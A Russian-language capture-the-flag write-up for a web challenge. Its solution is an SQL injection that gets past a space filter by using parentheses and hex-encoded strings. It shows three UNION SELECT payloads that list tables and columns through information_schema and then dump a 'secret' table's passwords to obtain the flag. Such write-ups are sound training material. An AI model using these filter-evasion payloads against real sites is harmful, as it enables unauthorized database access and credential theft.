# Укус гадюки

### Сложность: 200
### Категория: web

### Описание:
Наши жрецы сокрыли секретный код для открытия пирамиды великого Хеопса где-то в глубине этой скрижали, помогите им разузнать его.<br>
Формат флага: начинается с решетки (#)

### Хинты:
Зачастую, **Неверный Id!**  === **FILTERED**

### Решение:
Sql-injection в которой невозможны пробелы.

Три запроса:
~~~~
0x696e666f726d6174696f6e5f736368656d61 = information_schema
?id=(-1)union(select(1),(select(group_concat(table_name))from(information_schema.tables)where(table_schema)!=(0x696e666f726d6174696f6e5f736368656d61)))
~~~~
Узнаем о существовании таблицы secret

~~~~
0x736563726574 = secret
?id=(-1)union(select(1),(select(group_concat(COLUMN_NAME))from(information_schema.columns)where(TABLE_NAME)=(0x736563726574)))
~~~~
Узнаем о столбцах таблицы secret - name,pass

~~~~
?id=(-1)union(select(1),(SELECT(group_concat(pass))FROM(secret)))
~~~~
Получаем флаг